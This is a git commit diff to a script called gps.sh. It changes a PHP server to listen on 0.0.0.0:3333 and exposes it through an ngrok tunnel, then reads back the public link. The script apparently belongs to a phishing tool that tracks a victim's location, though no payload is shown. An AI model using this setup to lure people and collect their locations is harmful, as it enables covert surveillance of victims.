8bdb090ffb6eb8bfe711066fbc28b6c4a9090824
WongBiasa <74451855+WongBiasa@users.noreply.github.com>
2020-12-21 10:54:51 +0700

    Update gps.sh

--- gps.sh
+++ gps.sh
@@ -332,10 +332,10 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Start php server...\n"
-php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
+php -t "server/" -S 0.0.0.0:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Start ngrok server...\n"
-./ngrok http $port > /dev/null 2>&1 &
+./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
